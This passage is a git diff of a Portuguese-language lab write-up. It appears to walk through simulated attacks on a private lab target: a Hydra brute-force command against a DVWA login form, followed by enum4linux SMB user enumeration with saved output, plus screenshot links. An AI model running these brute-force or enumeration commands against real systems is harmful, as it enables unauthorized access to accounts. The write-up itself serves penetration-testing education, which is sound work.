@@ -60,3 +60,27 @@ Acesso com qualquer credencial para verificar em modo de desenvolvedor no navega
 ### 2. Simulando ataque ao alvo HTTP utilizando o Hydra
 
     hydra -L users.txt -P pass.txt 192.168.217.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -t8 -f
+![](/images/10%20comando%20hydra%20forca%20bruta.PNG)
+![](/images/11%20encontrado%20login.PNG)
+
+### 3. Simulando um ataque ao alvo utilizando o protocolo SMB
+Realizando o comando para iniciar uma enumeração de usuarios, verificando quais são os usuarios reais no sistema e grava a saida do comando em um arquivo txt:
+
+    enum4linux -a 192.168.217.3 | tee enum4_output.txt
+
+
+![](/images/12%20enumerandousuarios.PNG)
+![](/images/13%20enumerandousuarios.PNG)
+![](/images/14%20enumerandousuarios.PNG)
+![](/images/15%20enumerandousuarios.PNG)
+![](/images/16%20enumerandousuarios.PNG)
+![](/images/17%20enumerandousuarios.PNG)
+![](/images/18%20enumerandousuarios.PNG)
+![](/images/19%20enumerandousuarios.PNG)
+
+Lendo o arquivo enum4_output.txt
+
+    less enum4_output.txt
+
+![](/images/20%20lendo%20arquivo%20criado.PNG)
+![](/images/21%20lendo%20arquivo%20criado.PNG)
